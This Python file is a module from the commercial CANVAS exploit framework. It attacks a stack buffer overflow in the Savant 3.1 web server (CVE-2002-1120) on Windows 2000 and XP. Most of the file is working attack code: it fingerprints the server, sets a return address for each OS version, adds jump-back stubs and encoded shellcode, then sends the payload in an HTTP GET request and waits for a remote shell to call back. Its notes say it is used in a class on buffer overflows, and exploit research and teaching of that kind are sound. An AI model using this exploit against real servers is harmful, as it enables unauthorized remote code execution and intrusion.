#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator


NAME="savant"
DESCRIPTION="savant web server stack overflow."
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Savant"
DOCUMENTATION["Repeatability"]="This is a one shot exploit."
DOCUMENTATION["VersionsAffected"]="Savant 3.1"
DOCUMENTATION["CVE Name"] = "CVE-2002-1120"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1120"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]

NOTES="""
3.1:
There's an off-by-X here, with a strcpy at 416a41 which does the damage. There are
arguments on the stack after the return address which make it difficult to progress too 
far.

Another good breakpoint: 40c171
EBP is owned at 40cbe5

May have some issues if Savant is not installed in the default location (C:\Savant\)

This is a moderately difficult exploit we often use for our class on buffer overflows.
"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit
    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=80
        self.host=""
        self.badstring="\x00\r\n? /\\&+"
        self.ssl=0
        self.setVersions()
        self.version=1
        self.searchbadstring="\x00\r\n? /\\&+"
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows 2000 SP4 ENG",0x74fdee63)
        self.versions[2]=("Windows XP SP2 ENG",0x7C941EED)
        



    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        ret=self.createWin32SearchShellcode(host,port)
        self.log("Length of searchcode=%s"%len(self.encodedsearchcode))
        return ret
    
    def test(self):
        """
        
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        self.websend(s,"HEAD / HTTP/1.0\r\n\r\n")
        data=s.recv(1000)
        self.log("Web server returned %s"%prettyprint(data[:300]))
        #only return 1 if we have a Savant string
        ret=data.count("Savant/3.1")
        if ret:
            self.log("Assuming Windows 2K SP4 ENG for Savant")
            self.version=1
        return ret
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            if not self.test():
                self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
                return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
            self.websend(s,sploitstring)
        except:
            #import traceback
            #traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
            return 0

        self.log("Sleeping for two seconds to check for callback")
        time.sleep(2)
        ret=self.ISucceeded()
        self.setInfo("%s attacking %s:%d - done (success=%d!)"%(NAME,self.host,self.port,ret))
        return ret
        
    def makesploit(self):
        """
        Construct the attack
        """

        geteip=self.versions[self.version][1]
        #jump back to just before some corrupted data using this writable address
        writable=0x7ffdf0eb
        sploitstring="\xcc"*(271+4+4+5)
        offset=271-4
        jmpback=binstring("e9 ff ff fe 04")
        jmpback="\xcc"*5 # for testing
        #jmpesp at 74fdee63
        sploitstring=stroverwrite(sploitstring,intel_order(geteip),offset)
        sploitstring=stroverwrite(sploitstring,intel_order(writable),offset+4)
        sploitstring=stroverwrite(sploitstring,intel_order(writable),offset+8)
        sploitstring=stroverwrite(sploitstring,jmpback,offset+12)
        jmpback2="\xeb\xf9" #jump back 5 bytes so we can do a real jump back
        sploitstring=stroverwrite(sploitstring,jmpback2,offset-10)
        jmpback3="\xe9\xff\xfe\xff\xff"
        sploitstring=stroverwrite(sploitstring,jmpback3,offset-10-5)
        #shellcode must be < 236 bytes!
        #shove our shellcode right at the start of our string
        sploitstring=stroverwrite(sploitstring,self.encodedsearchcode,0) 
        
        sploitstring="GET /%s HTTP/1.0\r\nContent-Length: %d\r\n\r\n%s"%(sploitstring,len(self.shellcode),self.shellcode)
        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
